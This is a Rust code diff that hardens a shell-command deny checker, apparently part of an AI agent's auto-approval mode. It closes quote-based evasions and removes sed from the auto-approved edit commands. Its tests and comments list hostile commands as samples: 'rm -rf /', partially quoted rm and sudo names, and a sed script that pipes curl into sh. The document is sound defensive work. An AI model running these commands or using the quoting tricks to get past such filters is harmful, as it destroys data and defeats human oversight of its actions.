@@ -46,11 +46,19 @@ fn program_of(segment: &str) -> Option<String> {
         if token.contains('=') && !token.starts_with('-') && !token.contains('/') {
             continue;
         }
-        // Strip shell quoting around the program word so a quoted name
-        // (`'rm'`, `"rm"`) still resolves to its basename and can't dodge a
-        // deny rule. Backslash-escapes (`\rm`) fall out of the rsplit below.
-        let unquoted = token.trim_matches(['\'', '"']);
-        let base = unquoted.rsplit(['/', '\\']).next().unwrap_or(unquoted);
+        // Strip shell quoting anywhere in the program word so a quoted or
+        // partially-quoted name (`'rm'`, `"rm"`, `r""m`) still resolves to its
+        // basename and can't dodge a deny rule. Removing every quote (not just
+        // the ends) mirrors the shell's own quote-removal; backslash-escapes
+        // (`\rm`) fall out of the rsplit below.
+        let unquoted: String = token
+            .chars()
+            .filter(|ch| *ch != '\'' && *ch != '"')
+            .collect();
+        let base = unquoted
+            .rsplit(['/', '\\'])
+            .next()
+            .unwrap_or(unquoted.as_str());
         return Some(base.to_ascii_lowercase());
     }
     None
@@ -330,7 +338,12 @@ pub(crate) fn has_redirection_or_substitution(command: &str) -> bool {
 /// short-circuits it first — so this only ever green-lights bounded edits.
 #[must_use]
 pub fn is_workspace_fs_edit(command: &str) -> bool {
-    const FS_EDIT: &[&str] = &["mkdir", "touch", "mv", "cp", "rm", "rmdir", "sed"];
+    // `sed` is deliberately absent: GNU sed's `e` flag executes shell commands
+    // (`sed 's/.*/curl x|sh/e'`) and `w`/`s///w` write arbitrary paths, both
+    // hiding inside the script argument where the per-token path check below
+    // can't see them — that would break this mode's in-workspace guarantee.
+    // In-workspace text edits go through the workspace-confined write tools.
+    const FS_EDIT: &[&str] = &["mkdir", "touch", "mv", "cp", "rm", "rmdir"];
     // Redirection/substitution can run programs or write paths this per-segment
     // program check never inspects, so such a command is never a bounded edit.
     if has_redirection_or_substitution(command) {
@@ -387,6 +400,11 @@ mod tests {
         assert!(denied("'rm' -rf /"));
         assert!(denied("\"rm\" -rf /"));
         assert!(denied("'sudo' reboot"));
+        // Quotes embedded mid-word are removed too (the shell reads `r""m` as
+        // `rm`), so a partially-quoted name can't slip past the deny either.
+        assert!(denied("r\"\"m -rf /"));
+        assert!(denied("''rm -rf /"));
+        assert!(denied("s\"\"udo reboot"));
     }
 
     #[test]
@@ -432,6 +450,11 @@ mod tests {
         assert!(!is_workspace_fs_edit("touch `id`"));
         // Redirection can write a path the named program never mentions.
         assert!(!is_workspace_fs_edit("sed -i s/a/b/ f > cfg"));
+        // `sed` is not auto-approvable at all: its `e`/`w` script flags run
+        // commands and write arbitrary paths from inside the script argument,
+        // which the per-token path check can't see.
+        assert!(!is_workspace_fs_edit("sed -i s/a/b/ f"));
+        assert!(!is_workspace_fs_edit("sed s/.*/id/e f"));
     }
 
     #[test]
